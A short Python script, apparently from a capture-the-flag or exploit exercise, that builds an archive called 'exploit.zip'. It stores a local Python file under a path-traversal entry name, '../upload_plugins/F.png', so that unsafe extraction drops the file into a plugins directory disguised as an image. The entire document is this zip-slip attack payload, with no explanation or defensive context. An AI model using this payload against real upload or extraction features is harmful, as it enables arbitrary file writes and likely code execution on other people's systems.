import zipfile

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.write('try.py', '../upload_plugins/F.png')
